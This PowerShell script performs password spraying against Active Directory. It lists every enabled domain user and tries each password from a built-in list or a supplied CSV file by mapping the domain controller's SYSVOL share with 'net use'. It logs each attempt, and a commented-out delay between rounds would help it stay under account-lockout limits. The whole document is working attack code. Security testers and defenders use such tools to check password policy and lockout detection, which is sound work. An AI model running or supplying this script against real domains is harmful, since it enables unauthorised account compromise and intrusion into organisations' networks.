Param
 (
    $Domain = 'na.trd.com',
    $AuthType = 'NTLM',
    $PasswordFile
 )

$DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
$DomainDC = $DomainDCInfo.Name
$DomainDCIP = $DomainDCInfo.IPv4Address
[array]$DomainInfo = Get-ADDomain -Server $DomainDC
$DomainInfoDNS = $DomainInfo.DNSRoot

IF (!$PasswordFile)
 { [array]$PasswordArray = @('Password99!','ThisIsASecurePassword!','Password1234!') }
IF ($PasswordFile)
 { [array]$PasswordArray = Import-CSV $PasswordFile }

[array]$UserAccountArray = Get-ADUser -Filter * | Where { $_.Enabled -eq $True} 

ForEach ($PasswordArrayItem in $PasswordArray)
 {
    ForEach ($UserAccountArrayItem in $UserAccountArray)
     {
        $username = $DomainInfo.NetBIOSName + '\' + $UserAccountArrayItem.SamAccountName

        IF ($AuthType -eq 'NTLM')
          { $RemotePath = "\\$DomainDCIP\SYSVOL" }
        IF ($AuthType -eq 'Kerberos')
          { $RemotePath = "\\$DomainInfoDNS\SYSVOL" }

        $Command  = "cmd /c Net Use z: $RemotePath $PasswordArrayItem /user:$username /persistent:no"
        Write-Output "Attempting authentication for Account $username with Password $PasswordArrayItem "
        TRY
         { 
            $CommandOutput = Invoke-Expression $Command -ErrorAction Stop
           # Write-Output "Password for $username is $PasswordArrayItem" 
         }
        CATCH
         { Write-Host "Password is incorrect" }

         TRY
          {
             $CommandDel = "cmd /c net use Z: /Delete"
             Invoke-Expression $CommandDel -ErrorAction Stop
          }
         CATCH {}
     }
    # Start-Sleep -Seconds 300
 }

# net use [driveletter:] \\servername\sharename [password] /user:[domain\]username [/persistent:yes|no]
#  Get-SMBMapping
#  remove-smbmapping